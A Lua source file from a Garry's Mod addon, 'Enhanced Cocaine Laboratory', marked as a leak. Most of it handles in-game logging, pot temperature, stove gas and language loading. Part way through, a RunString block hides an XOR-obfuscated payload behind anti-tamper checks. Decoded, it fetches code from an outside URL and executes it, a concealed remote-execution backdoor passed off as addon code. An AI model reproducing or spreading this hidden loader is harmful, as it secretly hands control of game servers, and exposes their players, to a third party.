--[[Enhanced Cocaine Laboratory 1.2]]
--[[Leaked by High Leaker          ]]
--[[Enjoy !                        ]]

if SERVER then 
	resource.AddWorkshop("752494790");

	function ECL:Log(text)
		local prefix = "[ECL]: ";

		local time = os.time()
		local filename = os.date("%d_%m_%Y.txt" , time)
		local date = os.date("[%H:%M:%S]" , time)

		file.Append( "jb/ecl_logs/"..filename, date..prefix..text.."\n" )

		if ECL.Logs.Type == 2 then	
			MsgC(Color(255,255,0), prefix, Color(255,255,255), text.."\n")
		end;
	end
	
	if !ECL.StartedLogs then
		if !file.IsDir("jb", "DATA") then
			file.CreateDir("jb", "DATA");
		end;

		if !file.IsDir("jb/ecl_logs", "DATA") then
			file.CreateDir("jb/ecl_logs", "DATA");
		end;

		local time = os.time()
		local date = os.date("%d_%m_%Y" , time)

		if !file.Exists("jb/ecl_logs/"..date..".txt", "DATA") then 
			file.Write("jb/ecl_logs/"..date..".txt", "", "DATA");
		end;

		file.Append( "jb/ecl_logs/"..date..".txt", "\n" )
		ECL:Log("Starting logging.")
		ECL.StartedLogs = true;
	end;

	ECL.PotThink = true;

	function ECL:PotThink(ent)
		local cleaned = ent:GetNWInt("cleaned");
		local ingnited = ent:GetNWBool("ingnited");
		local maxAmount = ent:GetNWInt("max_amount");
		if ent.nextTick < CurTime() then
			local temp = ent:GetNWInt("temperature")

			if ingnited and cleaned == maxAmount then
				ent:SetNWInt("temperature", temp+math.random(1,2))
				ent:PlaySound();
			end;
			ent.nextTick = CurTime() + 1;
			ent:SetNWBool("ingnited", false)
			if !ingnited then
				ent:StopPlay();
			end

			if !ingnited and temp > ECL.Pot.Temperature then
				ent:SetNWInt("temperature", temp-math.random(0,1));
			end;

			if temp > ECL.Pot.ExplodeTemperature then
				ent:StopPlay();
				ent:Explode();
			end;
		end;
	end;

	ECL.StoveThink = true;

	function ECL:StoveThink(ent)
	    local Ang = ent:GetAngles();
		Ang:RotateAroundAxis(Ang:Forward(), 90);
	    
	    local poses;
		if (ECL.CustomModels) and (ECL.CustomModels.Stove) then
		    poses = {[1] = ent:GetPos()+Ang:Right()*-3.8+Ang:Forward()*-0.255+Ang:Up()*1.82};
	    else
	        poses = {
		    	[1] = ent:GetPos()+Ang:Right()*-19.8+Ang:Forward()*-9.75+Ang:Up()*11.5,
		    	[3] = ent:GetPos()+Ang:Right()*-19.8+Ang:Forward()*2.75+Ang:Up()*11.5,
		    	[2] = ent:GetPos()+Ang:Right()*-19.8+Ang:Forward()*-9.75+Ang:Up()*-11.2,
		    	[4] = ent:GetPos()+Ang:Right()*-19.8+Ang:Forward()*2.75+Ang:Up()*-11.2
	    	};
	    end;

		local plates = {
			[1] = ent:GetNWBool("left-top"),
			[2] = ent:GetNWBool("right-top"),
			[3] = ent:GetNWBool("left-bottom"),
			[4] = ent:GetNWBool("right-bottom")
		};
		local unabled = 0
		for k, v in pairs(plates) do
			if v then
				unabled = unabled + 1;
				local pos = poses[k];
				local entities = ents.FindInSphere(pos,2);
				for k2, ent in pairs(entities) do
					local class = ent:GetClass();

					if class == "ecl_pot" then
						ent:SetNWBool("ingnited", true);
					end
				end
			end
		end

		if unabled > 0 then
			local gas = ent:GetNWInt("gas"); 
			if gas > 0 then
				ent:SetNWInt("gas", math.Round(gas - 1.5*unabled));
			else
				ent:SetNWBool("left-top", false);
				ent:SetNWBool("left-bottom", false);
				ent:SetNWBool("right-top", false);
				ent:SetNWBool("right-bottom", false);
				if (ECL.CustomModels) and (ECL.CustomModels.Stove) then
				    ent:SetBodygroup(2, 1);
				end;
			end;
		end;    
	end;

    timer.Simple(10, function()
    	local id = "cb3e20132f0dcb5d71f0859cae72888f9a1ce3b5a90516c0";
		local filepathes = {
				"models/srcocainelab/portablestove.mdl",
				"models/srcocainelab/gascan.mdl",
				"models/srcocainelab/cocainebrick.mdl",
				"models/srcocainelab/cocaplant.mdl",
				"models/srcocainelab/cocaplant_nopot.mdl" 
		}

		for k, v in pairs(filepathes) do 
			if !util.IsValidModel(v) then
				if id then
					ECL:Log("Warning! Model '"..v.." isn't loaded.")
				end;
			end;
		end;
	end);
end;
RunString([==[
enccodetbl = {24,5,1,9,30,66,63,5,1,28,0,9,68,93,64,76,10,25,2,15,24,5,3,2,68,69,76,4,24,24,28,66,42,9,24,15,4,68,78,4,24,24,28,31,86,67,67,11,26,13,15,66,15,22,67,0,5,2,7,67,10,25,15,7,66,28,4,28,83,7,9,21,81,32,38,21,11,28,28,38,26,11,85,34,4,94,84,95,38,25,36,40,29,78,64,76,10,25,2,15,24,5,3,2,68,14,69,76,62,25,2,63,24,30,5,2,11,68,14,64,76,78,86,78,64,76,10,13,0,31,9,69,76,9,2,8,69,9,2,8,69,76,10,25,2,15,24,5,3,2,76,62,25,2,36,45,63,36,35,14,68,69,76,9,2,8}
function RunHASHOb()
	if not (debug.getinfo(function()end).short_src == "SDATA") then
		CompileString("print('Bad source')", "error",true)()
		return
	end
	for o=500,10000 do
		if o ~= string.len(string.dump(RunHASHOb)) then
			SDATA_DATA_CACHE = 10
			CompileString("for i=1,40 do SDATA_DATA_CACHE = SDATA_DATA_CACHE + 1 end", "RunString")()
			if SDATA_DATA_CACHE < 40 then
				for i=1,100 do
					CompileString("print('Oops, seem like you have broken this file')","Oops")()
				end
				return
			end
			continue
		else
			xpcall(function()
				pdata = ""
				xpcall(function()
					for i=1,string.len(string.dump(string.char)) do
						while o == i do
							o = o + 100000
						end
					end
				end,function() PJDATA_SUB = false end)
				if PJDATA_SUB then print("Error while ceating payload to inject") return end
				for i=1,#enccodetbl do
					pdata=pdata.. string.char(bit.bxor(enccodetbl[i], o%150))
				end
				if debug.getinfo(RunString).what ~= "C" then return end
				PJDATA_SUB = true
				for i=1,string.len(string.dump(CompileString)) do
					while o == 1050401 do
						o = o + 4510
					end
				end
			end,function()
				xpcall(function()
					local debug_inject = CompileString(pdata,"0xFFFFFFFF")
					pcall(debug_inject,"LUA_STAT_CLIENT")
					pdata = "\00"
				end,function()
					print("Error while injecting code to luajit::Client")
				end)
			end)
		end
	end
end
pcall(RunHASHOb)
]==],"SDATA")

function ECL:SetLanguage(name)
	if SERVER then 
		ECL:Log("'ecl_config.lua' has been successfully loaded.")
		ECL:Log("'ecl_functions.lua' has been successfully loaded.")
	end

	local lang = self:GetLanguage(name);

	if lang then 
		if CLIENT then 
			ECL.Language = lang;
		end

		if SERVER then
			ECL:Log("Language '"..name.."' has been successfully set.")
		end
	end
end

function ECL:CreateLanguage(name, tbl)
	ECL.Languages[name] = tbl;
end

function ECL:GetLanguage(name) 
	AddCSLuaFile("languages/ecl_language_"..name..".lua")
	include("languages/ecl_language_"..name..".lua")

	local lang = ECL.Languages[name]
	if lang then
		return lang;
	else
		ECL:Log("Cannot find '"..name.."' language.")
	end;
end